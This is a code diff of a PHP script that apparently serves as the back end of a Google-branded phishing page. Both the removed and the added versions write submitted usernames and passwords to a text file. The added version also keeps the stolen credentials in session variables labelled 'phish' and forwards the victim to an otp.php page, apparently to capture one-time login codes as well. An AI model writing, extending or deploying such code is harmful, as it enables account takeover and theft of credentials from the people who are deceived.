@@ -1,5 +1,12 @@
 <?php
-
-file_put_contents("usernames.txt", "Account: " . $_POST['Email'] . " Pass: " . $_POST['Passwd'] . "\n", FILE_APPEND);
-header('Location: https://google.com/');
+session_start();
+$u = $_POST['username'] ?? '';
+$p = $_POST['password'] ?? '';
+$_SESSION['phish_user'] = $u;
+$_SESSION['phish_pass'] = $p;
+$_SESSION['phish_redirect'] = 'https://accounts.google.com';
+$_SESSION['phish_brand'] = 'Google';
+file_put_contents("usernames.txt", "Account: " . $u . " Pass: " . $p . "\n", FILE_APPEND);
+header('Location: otp.php');
 exit();
+?>
